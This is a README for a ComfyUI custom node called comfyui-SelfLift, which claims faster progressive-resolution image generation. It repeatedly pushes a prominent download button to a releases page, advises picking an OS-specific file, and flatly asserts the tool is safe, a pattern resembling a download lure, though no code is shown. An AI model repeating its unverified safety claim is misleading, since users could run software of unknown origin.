<h1>🎨 comfyui-SelfLift - Faster Image Generation Without Training</h1>

<p align="center">
  <a href="https://github.com/berdoataqwa-wq/comfyui-SelfLift/releases" style="display:inline-block;padding:16px 32px;background:#ff6b6b;color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
</p>

## 🤔 What Is This?

comfyui-SelfLift is a **speed booster** for ComfyUI, a popular tool that lets you create images using artificial intelligence. Think of it like a turbo button for your AI image generator. Normally, creating high-quality images takes a lot of time and computing power. SelfLift changes that by using a clever trick: it first creates a small, rough version of your image, then quickly "lifts" it up to full size and adds the fine details. The result is the same beautiful image, but generated much faster.

This is based on a scientific paper called SelfLift-zero, designed for a specific type of AI model called "rectified-flow." It also includes experimental features for audio-video generation (MiniMax H3) and a temporal-attention fix (TST), but those are for advanced users who like to tinker.

## 📥 Download and Installation

Visit this link to download the application: **[https://github.com/berdoataqwa-wq/comfyui-SelfLift/releases](https://github.com/berdoataqwa-wq/comfyui-SelfLift/releases)**

Once you're on that page, you'll see a list of files. Look for the one that matches your operating system (Windows is the most common). Download it to your computer. After the download finishes, you're ready to install.

### 📝 Step-by-Step Setup (For Beginners)

1.  **Find your ComfyUI folder:** Locate where ComfyUI is installed on your computer. Usually, it's in a folder called `ComfyUI` or `comfyui`.
2.  **Open the `custom_nodes` folder:** Inside your ComfyUI folder, there's a sub-folder called `custom_nodes`. This is where extra features like SelfLift live.
3.  **Place SelfLift:** Take the file you downloaded and put it inside the `custom_nodes` folder. If you downloaded a ZIP file, extract it first—you should see a folder named something like `comfyui-SelfLift`. Move that whole folder into `custom_nodes`.
4.  **Restart ComfyUI:** Close and reopen ComfyUI. The SelfLift nodes will now appear in the node list under the category `selflift`.

That's it! You don't need to write any code or run any commands.

## ⚙️ How to Use It

Using SelfLift is straightforward, even if you've never touched code.

1.  **Add the Node:** In ComfyUI's interface, right-click on the empty canvas and search for "SelfLift." There are a few different nodes, but the main one for images is called **"SelfLift Progressive Sampler (Image)."** Add it to your workspace.
2.  **Connect the Cables:** Think of ComfyUI like a stereo system with cables. You'll need to connect a few things:
    *   Connect an **"Empty Latent Image"** node (this is your blank canvas) to the SelfLift node's input.
    *   Connect the **model** (your AI) to the SelfLift node.
    *   Connect a **VAE** (the "translator" for your images) to the SelfLift node.
    *   Connect a **`KSamplerSelect`** node and choose `euler` as the sampler. Then connect that.
    *   Connect the standard **scheduler** (like `normal`) from your model to the SelfLift node.
3.  **Adjust Settings:** You can leave the settings as they are for a first try. There's a table below explaining what each setting does if you want to fine-tune.

### 📊 Node Settings Explained

| Setting | What it Does |
| :--- | :--- |
| `transition_ratio` | This controls *when* the image goes from low resolution to high resolution. Lower values go high-res earlier, higher values stay low-res longer. A value around 0.5 is a good starting point. |

*Other settings may appear depending on the version; the tooltips in ComfyUI will explain them too.*

## ✨ Features That Make You Faster

*   **No Training Required:** SelfLift works with your existing AI model. You don't need to spend hours or days "teaching" it anything new.
*   **Progressive Resolution:** It's smart about how it works. It does the heavy lifting (the "early denoising" steps) on a smaller, easier-to-compute image, then finishes the job in high definition.
*   **Compatible:** It works like the standard `SamplerCustom` in ComfyUI, so if you're already using ComfyUI, this will feel familiar.
*   **Experimental Extras:** The package includes cutting-edge, experimental ports for audio-video and temporal correction. These are for enthusiasts who want to be at the frontier.

## 🛠️ Troubleshooting & Common Questions

**My images look blurry or weird. What's wrong?**
Check that you've chosen the `euler` sampler in the `KSamplerSelect` node. SelfLift is designed for that sampler and other samplers are rejected by design. Also, double-check your connections are all correct.

**It says "sampler rejected." Why?**
As mentioned above, SelfLift works with the `euler` sampler and the model's *normal* scheduler. If you selected something else (like `dpmpp_2m`), it will not work. Change it back to `euler`.

**Do I need a powerful computer?**
You will need a computer that can already run ComfyUI. SelfLift helps make the *generation* faster, but it doesn't remove the basic requirement of having a compatible GPU (usually NVIDIA).

**Is this safe to use?**
Yes, it's an open-source tool designed to slot into ComfyUI. Like any new software, it's a good idea to back up your work, but it operates within ComfyUI's normal framework.

## ❓ Need More Help?

If you run into problems, here are a few things you can do:
*   Look for a "Help" or "Issues" section on the download page.
*   Search online forums for "ComfyUI SelfLift" to see if other users have found solutions.
*   Compare your setup with the visual diagrams other people have shared.

## 🧩 What's Inside the Box?

*   **SelfLift Progressive Sampler (Image):** The main node for speeding up image generation.
*   **Audio-Video Adaptation (Experimental):** A port of the concept for MiniMax H3 models. Not for the faint of heart.
*   **TST Port (Experimental):** A temporal-attention correction tool for advanced workflows.

## 💡 Tips for Best Results

*   Start with a simple workflow. Get a basic image out the door, then add more complex nodes.
*   The `transition_ratio` setting is your friend. Experiment with it—try `0.4` for a faster draft, or `0.6` for more detail. Every model behaves a little differently.
*   For standard images, keep your seed the same if you want to compare different settings. If you change the seed, the image will be completely different, and it's hard to tell if a setting helped.

## 📜 License and Credits

This project is inspired by the academic paper "SelfLift-zero" for rectified-flow models. The code is provided as-is for the ComfyUI community. Always credit the original authors if you use this for research.

---

We hope you enjoy lightning-fast generation! Remember, visit the link below to get started.

**[🚀 Go to Download Page](https://github.com/berdoataqwa-wq/comfyui-SelfLift/releases)**